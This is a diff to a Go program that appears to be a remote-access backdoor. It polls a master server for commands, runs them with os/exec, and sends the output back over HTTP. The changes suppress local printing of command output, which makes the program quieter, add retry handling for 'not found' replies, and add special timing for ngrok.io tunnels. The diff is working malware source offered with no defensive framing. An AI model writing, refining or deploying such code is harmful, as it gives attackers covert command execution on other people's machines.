@@ -1,7 +1,7 @@
 package main
 
 import (
-	"fmt"
+	"time"
 	"io/ioutil"
 	"net/http"
 	"os/exec"
@@ -14,7 +14,7 @@ func main() {
 	urlx := ""
 	for true {
 		result, urlxx := getmasterserver()
-		if len(string(result)) == 0 {
+		if len(string(result)) == 0 || strings.Contains(result,"not found") {
 			continue
 		} else {
 			urlx = urlxx
@@ -55,7 +55,7 @@ func sendoutput(urlx string, stdout string, err error) {
 	if err != nil {
 		return
 	}
-	fmt.Println(string(stdout))
+	//fmt.Println(string(stdout))
 	sendresponse(urlx, stdout)
 }
 
@@ -85,7 +85,7 @@ func sendresponse(urlx string, response string) {
 
 }
 
-func reciver(urlx string) (string, error) {
+func httpreq(urlx string) (string, error){
 	resp, err := http.Get(urlx)
 	if err != nil {
 		return err.Error(), err
@@ -96,4 +96,15 @@ func reciver(urlx string) (string, error) {
 		return err.Error(), err
 	}
 	return string(body), err
+}
+
+func reciver(urlx string) (string, error) {
+	if strings.Contains(urlx, "ngrok.io"){
+		body,err := httpreq(urlx)
+		time.Sleep(3 * time.Second)
+		return string(body), err
+	}else{
+		body,err := httpreq(urlx)
+		return string(body), err
+	}
 }
